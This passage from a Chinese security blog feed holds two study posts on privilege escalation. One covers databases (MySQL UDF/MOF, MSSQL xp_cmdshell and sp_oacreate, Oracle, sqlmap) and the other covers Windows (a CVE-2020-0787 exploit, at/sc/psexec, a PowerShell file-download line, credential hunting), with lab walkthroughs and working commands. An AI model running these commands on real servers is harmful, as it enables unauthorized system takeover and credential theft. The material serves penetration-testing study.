        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83.png" alt="数据库提权"></p><h2 id="0x01-数据库提权的意义及流程"><a href="#0x01-数据库提权的意义及流程" class="headerlink" title="0x01 数据库提权的意义及流程"></a>0x01 数据库提权的意义及流程</h2><p>1、意义：在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权；但需要知道数据库提权的前提条件：服务器开启数据库服务及获取到最高权限用户密码。除 Access 数据库外，其他数据库基本都存在数据库提权的可能。</p><p>2、流程 ：服务探针-信息收集-提权利用-获取权限</p><p>（一般提权是拥有普通用户的权限之后，或者webshell的权限之后进行的权限提升。）</p><h2 id="0x02-WEB或本地环境探针数据库应用"><a href="#0x02-WEB或本地环境探针数据库应用" class="headerlink" title="0x02 WEB或本地环境探针数据库应用"></a>0x02 WEB或本地环境探针数据库应用</h2><p>1、通过探针判断有数据库相关的服务</p><p>2、通过端口扫描看是否开启对应端口</p><p>3、通过命令段看是否开启相关服务</p><p>4、通过浏览文件或文件夹判定是否安装相关数据库</p><h2 id="0x03-数据库提权权限用户密码收集等方法"><a href="#0x03-数据库提权权限用户密码收集等方法" class="headerlink" title="0x03 数据库提权权限用户密码收集等方法"></a>0x03 数据库提权权限用户密码收集等方法</h2><p>1、配置文件、储存文件、暴力拆解、其他方式</p><p>2、配置文件：一些需要调用数据库的程序会有配置文件记录账号密码</p><p>3、储存文件：将数据库中的一些储存文件下载还原，解析里面的账号密码</p><p>4、暴力拆解：通过爆破脚本等爆破密码</p><p>（一般是前两种，第一种最常见。从相关的配置文件中获得账号密码。）</p><p>5、数据库的安装目录下有“data”目录，“data”下的每个文件夹对应数据库，每个文件夹中三个名称相同但后缀名不同的文件对应一个表，其中“.MYD”文件对应表的数据。MySQL数据库的所有账号密码就保存在“MySQL所在的文件夹\data\mysql\user.MYD”中，需要MD5解密。</p><p>root用户默认不支持外联，暴力破解时可以将爆破脚本上传到服务器，进行本地爆破。</p><h2 id="0x04-Mysql-UDF提权"><a href="#0x04-Mysql-UDF提权" class="headerlink" title="0x04 Mysql-UDF提权"></a>0x04 Mysql-UDF提权</h2><p>###0x00 原理</p><p>UDF（user definedfunction，用户定义函数），UDF的设计初衷是为了方便用户自定义一些函数，方便查询一些复杂的数据，同时也增加了使用UDF提权的可能。攻击者通过编写调用cmd或者shell的udf.dll文件，并且导入到一个指定的文件夹目录下，创建一个指向udf.dll的自定义函数，从而在数据库中的查询就等价于在cmd或者shell中执行命令。</p><h3 id="0x01-版本差异"><a href="#0x01-版本差异" class="headerlink" title="0x01 版本差异"></a>0x01 版本差异</h3><p>不同的操作系统，不同的版本，提权时导出udf.dll存放的目录不一样。</p><p>导出数据时根据MySQL版本选择不同的目录：<br>mysql&lt;5.1      导出目录c:&#x2F;windows或system32</p><p>mysql&#x3D;&gt;5.1    导出安装目录&#x2F;lib&#x2F;plugin&#x2F; （其中plugin目录需要自行创建）</p><h3 id="0x02-相关命令"><a href="#0x02-相关命令" class="headerlink" title="0x02 相关命令"></a>0x02 相关命令</h3><p>select version();         查看版本</p><p>select @@basedir;    查看安装目录</p><p>（一般通过脚本实现文件导入和命令执行）</p><h3 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h3><p>首先是拿到了目标的webshll，获得的这个webshell权限很低。</p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620202955967.png" alt="image-20220620202955967"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>服务器是部署了mysql的，利用mysql提权，就需要找到mysql的账户和密码。</p><p>首先找配置文件：</p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620203254668.png" alt="image-20220620203254668"></p><p>这里有个database.php，猜测是数据库配置文件，打开查看：<br><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620203447146.png" alt="image-20220620203447146"></p><p>得到数据库的账户密码。</p><p>这里还可以通过查看<strong>数据库</strong>的<code>user.MYD</code>文件，里面存的是用户的密码的hash值，获取了以后可以通过cmd5或者其他途径进行解密。</p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620214532653.png" alt="image-20220620214532653"></p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620204619373.png" alt="image-20220620204619373"></p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620204658157.png" alt="image-20220620204658157"></p><p>将密码进行md5解密：<br><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620204737752.png" alt="image-20220620204737752"></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>拿到数据库账号密码。开始对数据库连接：<br><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620214620165.png" alt="image-20220620214620165"></p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>查看mysql的安装路径（绝对路径）</p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620214414946.png" alt="image-20220620214414946"></p><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>查看mysql的版本。发现是5.2版本，所以需要将dll文件放在lib\plugin目录下才可以生效，如果是5.1以下，需要放到 C:\Windows\system32下</p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620214701515.png" alt="image-20220620214701515"></p><h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>找到lib目录：（如果没有lib目录需要手动创建）</p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620214902877.png" alt="image-20220620214902877"></p><p>使用命令创建路径：,执行命令后发现报的是失败，但是检查文件夹，确实已经创建。</p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620214939729.png" alt="image-20220620214939729"></p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620214806178.png" alt="image-20220620214806178"></p><h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>使用同样的方法创建plugin文件夹。</p><p>使用直接导入的方式将udf.dll文件到指定位置。（udf.dll我以txt的形式放在附件）</p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620215029496.png" alt="image-20220620215029496"></p><h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><p>创建sys_eval函数，用于执行命令和回显：</p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620215058541.png" alt="image-20220620215058541"></p><h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><p>查看权限为系统权限：<br><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620215149894.png" alt="image-20220620215149894"></p><h2 id="0x05-Mysql-MOF提权"><a href="#0x05-Mysql-MOF提权" class="headerlink" title="0x05 Mysql-MOF提权"></a>0x05 Mysql-MOF提权</h2><h3 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h3><p>mof是windows系统的一个文件（在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>参考文章：<br><a href="https://www.cnblogs.com/xishaonian/p/6384535.html">https://www.cnblogs.com/xishaonian/p/6384535.html</a></p><h2 id="0x06-Mssql提权"><a href="#0x06-Mssql提权" class="headerlink" title="0x06 Mssql提权"></a>0x06 Mssql提权</h2><h3 id="0x00-xp-cmdshell提权"><a href="#0x00-xp-cmdshell提权" class="headerlink" title="0x00 xp_cmdshell提权"></a>0x00 xp_cmdshell提权</h3><p>xp_cmdshell默认在 mssql2000中是开启的，在mssql2005之后的版本中则默认禁止（这里2008就是禁用的）。如果用户拥有管理员sa权限则可以用 sp_configure 重新开启它。</p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>查找xp_cmdshell：<br><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620220622945.png" alt="image-20220620220622945"></p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620220636731.png" alt="image-20220620220636731"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>通过xp_cmdshell执行命令whoami: EXEC master.dbo.xp_cmdshell ‘命令’ </p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620220754397.png" alt="image-20220620220754397"></p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620220910597.png" alt="image-20220620220910597"></p><p>这里被阻止执行了，原因是因为没有开启xp_cmdshell。</p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>使用sp_configure开启xp_cmdshell（这里1就是开启，0是关闭）</p><p>启用命令：</p><pre class="line-numbers language-none"><code class="language-none">EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620221054833.png" alt="image-20220620221054833"></p><p>关闭命令：</p><pre class="line-numbers language-none"><code class="language-none">Exec sp_configure &#39;show advanced options&#39;,1 ；reconfigure;exec sp_configure &#39;xp_cmdshell&#39;,0;reconfigure;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>再次执行EXEC master.dbo.xp_cmdshell ‘命令’ ：<br><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620221639979.png" alt="image-20220620221639979"></p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620221628741.png" alt="image-20220620221628741"></p><p>成功提权。</p><h3 id="0x05-使用-sp-oacreate进行提权"><a href="#0x05-使用-sp-oacreate进行提权" class="headerlink" title="0x05  使用 sp_oacreate进行提权"></a>0x05  使用 sp_oacreate进行提权</h3><p>主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。</p><h3 id="0x06-1"><a href="#0x06-1" class="headerlink" title="0x06"></a>0x06</h3><p>执行命令：</p><pre class="line-numbers language-none"><code class="language-none">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod@shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c whoami &gt;c:\\1.txt&#39;调用cmd.exe执行whoami,并将结果输出为1.txt（便于查看回显结果）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="0x07-1"><a href="#0x07-1" class="headerlink" title="0x07"></a>0x07</h3><p>同样，开启组件：</p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620222008928.png" alt="image-20220620222008928"></p><p>启动命令：</p><pre class="line-numbers language-none"><code class="language-none">EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;RECONFIGURE WITH OVERRIDE;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>关闭命令：</p><pre class="line-numbers language-none"><code class="language-none">EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#39;Ole Automation Procedures&#39;, 0;RECONFIGURE WITH OVERRIDE;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620222122439.png" alt="image-20220620222122439"></p><h3 id="0x08-1"><a href="#0x08-1" class="headerlink" title="0x08"></a>0x08</h3><p>再次执行命令：<br><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220620222159666.png" alt="image-20220620222159666"></p><p>没有生成1.txt文件；过程思路就是这样的。</p><p>###0x09</p><p><strong>SQL Server提权方法汇总</strong>：</p><p><a href="https://blog.51cto.com/u_11797152/2411770">https://blog.51cto.com/u_11797152/2411770</a></p><h2 id="0x07-Oracle提权"><a href="#0x07-Oracle提权" class="headerlink" title="0x07 Oracle提权"></a>0x07 Oracle提权</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>Oracle数据库一般用于Java和jsp,如果jsp可以获取到后门的话，后门不需要提权，网站权限就是系统权限。</p><h3 id="0x01-普通用户模式"><a href="#0x01-普通用户模式" class="headerlink" title="0x01 普通用户模式"></a>0x01 普通用户模式</h3><p>前提是拥有一个普通的Oracle连接账号。不需要DBA权限，可提权至DBA，并以Oracle实例运行的权限执行操作系统命令。</p><h3 id="0x02-DBA用户模式"><a href="#0x02-DBA用户模式" class="headerlink" title="0x02 DBA用户模式"></a>0x02 DBA用户模式</h3><p>拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。（DBA账号是Oracle的最高权限） （使用自动化工具Oracleshellv1.0工具）</p><p><img src="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/image-20220621084439714.png" alt="image-20220621084439714"></p><h3 id="0x03-注入提升模式"><a href="#0x03-注入提升模式" class="headerlink" title="0x03 注入提升模式"></a>0x03 注入提升模式</h3><p>拥有一个Oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证。（前提是要有注入点），再配合Oracleshell进行命令执行</p><p>—SQLmap判断数据库是不是dba权限：</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http:&#x2F;&#x2F;192.168.131.142:8080&#x2F;sql.jsp?id-7698 --is-dba<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-windows提权</title>
      <link href="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%83/"/>
      <url>/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%83/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B3%BB%E7%BB%9F.png" alt="权限提升-服务器系统"></p><h2 id="0x01-windows权限划分"><a href="#0x01-windows权限划分" class="headerlink" title="0x01 windows权限划分"></a>0x01 windows权限划分</h2><h3 id="0x00-普通权限"><a href="#0x00-普通权限" class="headerlink" title="0x00 普通权限"></a>0x00 普通权限</h3><blockquote><p>1、默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限，<code>管理员组(Administrators)</code>、<code>高权限用户组(PowerUsers)</code>、<code>普通用户组(Users)</code>、<code>备份操作组(Backup Operators)</code>、<code>文件复制组(Replicator)</code>、<code>来宾用户组(Guests)</code>，<code>身份验证用户组(Ahthenticated users)</code>其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。</p><p>2、管理员组拥有大部分的计算机操作权限（并不是全部），能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限)。再往下就是高权限用户组，这一部分用户也能做大部分事情，但是不能修改系统设置，不能运行一些涉及系统管理的程序。普通用户组则被系统拴在了自己的地盘里，不能处理其他用户的文件和运行涉及管理的程序等。来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。身份验证用户组(Ahthenticated users)经过ms验证程序登录的用户均属于此组。</p></blockquote><h3 id="0x01-特殊权限"><a href="#0x01-特殊权限" class="headerlink" title="0x01 特殊权限"></a>0x01 特殊权限</h3><blockquote><p>​        除了上面提到的7个默认权限分组，系统还存在一些特殊权限成员，这些成员是为了特殊用途而设置，分别是：<code>SYSTEM(系统)</code>、<code>Trustedinstaller(信任程序模块)</code>、<code>Everyone(所有人)</code>、<code>CREATOR OWNER(创建者)</code>等，这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。<br>​        真正拥有“完全访问权的只有一个成员：<code>SYSTEM</code>。这个成员是系统产生的，真正拥有整台计算机管理权限的账户，一般的操作是无法获取与它等价的权限的。<br>​        “所有人权限与普通用户组权限差不多，它的存在是为了让用户能访问被标记为“公有”的文件，这也是一些程序正常运行需要的访问权限一一任何人都能正常访问被赋予“Everyone”权限的文件，包括来宾组成员，<br>​        被标记为“创建者“权限的文件只有建立文件的那个用户才能访问，做到了一定程度的隐私保护。<br>​         但是，所有的文件访问权限均可以被管理员组用户和SYSTEM成员忽略，除非用户使用了NTFS加密。<br>​        无论是普通权限还是特殊权限，它们都可以“叠加使用，“叠加就是指多个权限共同使用，例如一个账户原本属于<br>Users组，而后我们把他加入Administrators组在加入Trustedinstaller等权限提升，那么现在这个账户便同时拥有两个或多个权限身份，而不是用管理员权限去覆盖原来身份。权限叠加并不是没有意义的，在一些需要特定身份访问的场合，用户只有为自己设置了指定的身份才能访问，这个时候“叠加的使用就能减轻一部分劳动量了。</p></blockquote><h2 id="0x02-windows提权命令"><a href="#0x02-windows提权命令" class="headerlink" title="0x02 windows提权命令"></a>0x02 windows提权命令</h2><table><thead><tr><th align="center">命令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">systeminfo</td><td align="center">打印系统信息</td></tr><tr><td align="center">whoami</td><td align="center">获得当前用户名</td></tr><tr><td align="center">whami&#x2F;priv</td><td align="center">当前账户权限</td></tr><tr><td align="center">ipconfig</td><td align="center">网络配置信息</td></tr><tr><td align="center">ipconfig&#x2F;displaydns</td><td align="center">显示DNS缓存</td></tr><tr><td align="center">route print</td><td align="center">打印出路由表</td></tr><tr><td align="center">arp -a</td><td align="center">打印arp表</td></tr><tr><td align="center">hostname</td><td align="center">主机名</td></tr><tr><td align="center">net user</td><td align="center">列出用户</td></tr><tr><td align="center">net user UserName</td><td align="center">关于用户的信息</td></tr><tr><td align="center">net use\SMBPATH Pa$$w0rd &#x2F;u:UserName</td><td align="center">连接SMB</td></tr><tr><td align="center">net localgroup GROUP</td><td align="center">关于指定组的信息</td></tr><tr><td align="center">net view \127.0.0.1</td><td align="center">会话打开到当前计算机</td></tr><tr><td align="center">net session</td><td align="center">开放给其他机器</td></tr><tr><td align="center">netsh firewall show config</td><td align="center">显示防火墙配置</td></tr><tr><td align="center">DRIVERQUERY</td><td align="center">列出安装的驱动</td></tr><tr><td align="center">tasklist&#x2F;svc</td><td align="center">列出服务任务</td></tr><tr><td align="center">net start</td><td align="center">列出启动的服务</td></tr><tr><td align="center">dir &#x2F;s foo</td><td align="center">在目录中搜索包含指定字符的项</td></tr><tr><td align="center">dir &#x2F;s foo&#x3D;&#x3D;bar</td><td align="center">同上</td></tr><tr><td align="center">sc query</td><td align="center">列出所有服务</td></tr><tr><td align="center">sc qc Service Name</td><td align="center">找到指定服务的路径</td></tr><tr><td align="center">shutdown &#x2F;r &#x2F;t 0</td><td align="center">立即重启</td></tr><tr><td align="center">type file.txt</td><td align="center">打印出内容</td></tr><tr><td align="center">icacls”C:\Example”</td><td align="center">列出权限</td></tr><tr><td align="center">wmic qfe get Caption,Description,Hot FixID,InstalledOn</td><td align="center">列出已安装的补丁</td></tr><tr><td align="center">(New-Object System.Net.WebClient).DownloadFile(“<a href="http://host/file%22,%22C:/LocalPath">http://host/file&quot;,&quot;C:\LocalPath</a>“)</td><td align="center">利用ps远程下载文件到本地</td></tr><tr><td align="center">accesschk.exe -qwsu “Group”</td><td align="center">修改对象（尝试Everyone，Authenticated Users和&#x2F;或Users）</td></tr></tbody></table><h2 id="0x03-本地提权-系统溢出漏洞"><a href="#0x03-本地提权-系统溢出漏洞" class="headerlink" title="0x03 本地提权-系统溢出漏洞"></a>0x03 本地提权-系统溢出漏洞</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>靶机：winserver2008R2</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>首先使用whoami命令查看当前权限为管理员权限，由于要提权，再创建一个普通用户；</p><p>创建用户命令：<code>net user hhh haha@123456@ww /add</code>（hhh为用户名，haha@123456@ww为密码）</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%83/image-20220620085726442.png" alt="image-20220620085726442"></p><p>查看本地组：<br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%83/image-20220620085936860.png" alt="image-20220620085936860"></p><p>将新创建的hhh加入到Guests组：</p><p>命令：<code>net localgroup Guests hhh /add</code></p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%83/image-20220620090203942.png" alt="image-20220620090203942"></p><p>使用win+L切换用户：<br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%83/image-20220620090547874.png" alt="image-20220620090547874"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>利用CVE-2020-0787本地提权漏洞，在目标服务器执行BitsArbitraryFileMoveExploit.exe文件</p><p>直接拖进cmd运行：<br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%83/image-20220620091636698.png" alt="image-20220620091636698"></p><p>运行结束后会自动弹出cmd窗口，使用whoami查看当前权限：<br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%83/image-20220620091730890.png" alt="image-20220620091730890"></p><p>成功获得system权限，提权成功。</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>原理：</p><p>通过普通用户连接到计算机，只有普通用户权限，这个时候就可以使用这个本地提权漏洞将当前计算机的普通权限提升到系统权限。</p><h2 id="0x04-本地提权-AT-amp-SC-amp-PS-命令"><a href="#0x04-本地提权-AT-amp-SC-amp-PS-命令" class="headerlink" title="0x04 本地提权-AT&amp;SC&amp;PS 命令"></a>0x04 本地提权-AT&amp;SC&amp;PS 命令</h2><h3 id="0x00-AT提权"><a href="#0x00-AT提权" class="headerlink" title="0x00 AT提权"></a>0x00 AT提权</h3><p>at提权原理：<br>at命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用system权限。</p><p>适用版本：Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除。</p><p>当我们拿到低权限的用户，通过连接上服务器后，可以通过at命令来进行本地提权。</p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>测试主机：winserver2003</p><pre class="line-numbers language-none"><code class="language-none">命令：at 11:00 &#x2F;interactive cmd (在11:00分生成一个交互式的System权限的cmd)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%83/image-20220620093355065.png" alt="image-20220620093355065"></p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>提权成功：</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%83/image-20220620093436654.png" alt="image-20220620093436654"></p><h3 id="0x03-SC提权"><a href="#0x03-SC提权" class="headerlink" title="0x03 SC提权"></a>0x03 SC提权</h3><p>sc提权原理：<br>sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务。</p><p>适用版本：windows 7、8、03、08、12、16（win2003可以提权，其他未测基本失败）。</p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>创建一个名叫syscmd的新的交互式的cmd执行服务：</p><pre class="line-numbers language-none"><code class="language-none">命令：&#96;sc Create syscmdd binPath&#x3D; &quot;cmd &#x2F;K start&quot; type&#x3D; own type&#x3D; interact&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行服务之后，启动服务命令<code>：sc start syscmd</code><br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%83/image-20220620093859462.png" alt="image-20220620093859462"></p><p>提权成功。</p><h3 id="0x05-PS提权"><a href="#0x05-PS提权" class="headerlink" title="0x05 PS提权"></a>0x05 PS提权</h3><p>适用范围： 适用于Win2003 &amp; Win2008</p><p>微软官方工具包pstools：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><pre class="line-numbers language-none"><code class="language-none">命令：psexec.exe -accepteula -s -i -d cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%83/image-20220620094510844.png" alt="image-20220620094510844"></p><p>提权成功。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 